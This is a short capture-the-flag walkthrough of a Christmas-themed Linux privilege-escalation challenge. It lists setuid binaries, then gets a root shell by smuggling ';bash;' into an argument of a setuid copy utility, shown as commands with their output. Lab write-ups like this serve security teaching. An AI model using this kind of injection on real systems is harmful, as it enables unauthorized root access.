## Objective
Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

## Solution
- Find some binary which has setuid bit set
```
elf@c0cf78581afd:~$ find / -perm -u=s -type f 2> /dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```
- We find an unusual binary with suid bit set
```
elf@c0cf78581afd:~$ strings /usr/bin/simplecopy 
...
setuid
exit
....
Usage: %s <source> <destination>
cp %s %s
```
- We perform a combination of command and code injection to get a shell as root
```
elf@24797ae9021c:/usr/bin$ ./simplecopy '/etc/passwd' ';bash;'
```
- We navigate into the /root 
```
root@24797ae9021c:/usr/bin# cd /root
root@24797ae9021c:/root# ls -la
total 620
drwx------ 1 root root   4096 Dec  2 22:17 .
drwxr-xr-x 1 root root   4096 Jan  2 02:00 ..
-rw-r--r-- 1 root root   3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root    161 Dec  5  2019 .profile
-rws------ 1 root root 612560 Nov  9 21:29 runmetoanswer
```
- We make the binary executable
```
root@24797ae9021c:/root# chmod +x runmetoanswer 
root@24797ae9021c:/root# ls
runmetoanswer
root@24797ae9021c:/root# ./runmetoanswer 
```
- Flag for the Win!
```
root@24797ae9021c:/root# ./runmetoanswer 
Who delivers Christmas presents?

> Santa
Your answer: Santa

Checking....
Sorry, that answer is incorrect. Please try again!


root@24797ae9021c:/root# ./runmetoanswer 
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```
